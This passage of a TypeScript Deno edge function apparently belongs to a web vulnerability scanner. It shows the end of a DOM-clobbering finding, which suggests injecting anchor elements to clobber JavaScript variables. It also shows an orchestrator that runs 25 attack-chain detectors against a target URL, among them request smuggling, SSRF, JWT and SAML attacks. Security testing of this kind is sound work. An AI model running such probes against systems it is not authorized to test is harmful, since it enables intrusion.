      finding_type: "dom_clobber_candidate", severity: "medium", owasp: "A03:2021", mitre: "T1059.007", cwe: "CWE-1321",
      cvss: 6.5, confidence: 0.5,
      title: "DOM-clobbering surface (id/name → window globals)",
      description: "Page reads document.getElementById and window globals — inject <a id='config'> elements via stored HTML to clobber JS variables (universal XSS).",
      url_path: url.pathname,
    });
  }
}

// ─── ORCHESTRATOR ────────────────────────────────────────────────────────────
serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });
  try {
    const supabase = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
    const body: ChainReq = await req.json();
    const { scanId, target, passNumber = 12 } = body;
    if (!scanId || !target) return new Response(JSON.stringify({ error: "scanId & target required" }), { status: 400, headers: corsHeaders });

    const { url, host } = normalizeUrl(target);
    await supabase.from("scan_passes").update({ status: "running", started_at: new Date().toISOString() })
      .eq("scan_id", scanId).eq("pass_number", passNumber);
    await emitProgress(supabase, scanId, `🔗 vapt-chains pass starting (25 chain detectors)`);

    const detectors: Array<[string, () => Promise<void>]> = [
      ["multiSessionBOLA", () => multiSessionBOLA(supabase, scanId, host, url, body)],
      ["redirectSsrfChain", () => redirectSsrfChain(supabase, scanId, host, url)],
      ["storedXssAdminSim", () => storedXssAdminSim(supabase, scanId, host, url)],
      ["oastInject", () => oastInject(supabase, scanId, host, url)],
      ["metadataToWordlist", () => metadataToWordlist(supabase, scanId, host, url)],
      ["cachePoisoning", () => cachePoisoning(supabase, scanId, host, url)],
      ["polyglotUpload", () => polyglotUpload(supabase, scanId, host, url)],
      ["hppMassAssignment", () => hppMassAssignment(supabase, scanId, host, url)],
      ["oauthStateCsrf", () => oauthStateCsrf(supabase, scanId, host, url)],
      ["danglingCorsCombo", () => danglingCorsCombo(supabase, scanId, host, url)],
      ["requestSmuggling", () => requestSmuggling(supabase, scanId, host, url)],
      ["prototypePollution", () => prototypePollution(supabase, scanId, host, url)],
      ["raceCondition", () => raceCondition(supabase, scanId, host, url)],
      ["graphqlBatching", () => graphqlBatching(supabase, scanId, host, url)],
      ["jwtAttacks", () => jwtAttacks(supabase, scanId, host, url)],
      ["samlXsw", () => samlXsw(supabase, scanId, host, url)],
      ["cswsh", () => cswsh(supabase, scanId, host, url)],
      ["deserializationDetect", () => deserializationDetect(supabase, scanId, host, url)],
      ["sstiEscape", () => sstiEscape(supabase, scanId, host, url)],
      ["serverlessIamProbe", () => serverlessIamProbe(supabase, scanId, host, url)],
      ["pdfEngineSsrf", () => pdfEngineSsrf(supabase, scanId, host, url)],
      ["pathDesync", () => pathDesync(supabase, scanId, host, url)],
      ["cicdWebhook", () => cicdWebhook(supabase, scanId, host, url)],
      ["rangeCacheDeception", () => rangeCacheDeception(supabase, scanId, host, url)],
      ["domClobber", () => domClobber(supabase, scanId, host, url)],
    ];

    // Run in parallel batches of 5 to respect connection limits
    const results: Record<string, string> = {};
    for (let i = 0; i < detectors.length; i += 5) {
      const batch = detectors.slice(i, i + 5);
      await Promise.allSettled(batch.map(async ([name, fn]) => {
        try {
          await withTimeout(fn(), 15000);
          results[name] = "ok";
        } catch (e) {
          results[name] = e instanceof Error ? e.message : "err";
        }
      }));
      await emitProgress(supabase, scanId, `🔗 batch ${i / 5 + 1}/${Math.ceil(detectors.length / 5)} done`);
    }

    await supabase.from("scan_passes").update({
      status: "completed", completed_at: new Date().toISOString(),
      payload: { results, detectorsRun: detectors.length },
    }).eq("scan_id", scanId).eq("pass_number", passNumber);

    return new Response(JSON.stringify({ ok: true, host, detectorsRun: detectors.length, results }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : String(e) }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
